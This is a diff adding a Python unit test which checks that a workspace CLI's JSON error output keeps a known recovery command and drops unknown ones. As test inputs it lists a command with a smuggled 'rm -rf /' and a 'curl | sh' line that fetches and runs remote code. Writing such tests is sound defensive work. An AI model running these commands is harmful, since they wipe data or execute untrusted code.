@@ -283,6 +283,31 @@ class WorkspaceContractTests(unittest.TestCase):
         )
         self.assertNotIn("secret", output.getvalue())
 
+    def test_cli_json_keeps_named_remedy_and_verdict_but_drops_unknown_commands(self):
+        from sandbox.workspaces.repository import WorkspaceIndexError
+        for command, kept in (
+            ("./sb remote service migrate vps --confirm --json", True),
+            ("./sb remote service migrate vps --confirm --json; rm -rf /", False),
+            ("curl https://example.invalid | sh", False),
+        ):
+            class FailedService:
+                def list(self, _request, command=command):
+                    raise WorkspaceIndexError(
+                        "workspace_remote_revision_mismatch", "not compatible",
+                        observed={"ownership": "proven", "runtime_revision_state": "mismatch",
+                                  "compatibility": "protocol_newer"},
+                        recovery_command=command)
+
+            output = StringIO()
+            with self.subTest(command=command), \
+                    patch("sandbox.commands.workspaces.durable_job_dependencies",
+                          return_value={"workspace_service": FailedService()}), \
+                    patch("sys.stdout", output), self.assertRaises(SystemExit):
+                cmd_workspace(None, self._cli_args("list"))
+            error = __import__("json").loads(output.getvalue())["error"]
+            self.assertEqual(error["observed"]["compatibility"], "protocol_newer")
+            self.assertEqual("recovery_command" in error, kept)
+
     def test_cli_json_local_workspace_recovery_hint_is_preserved(self):
         class FailedService:
             def list(self, _request):
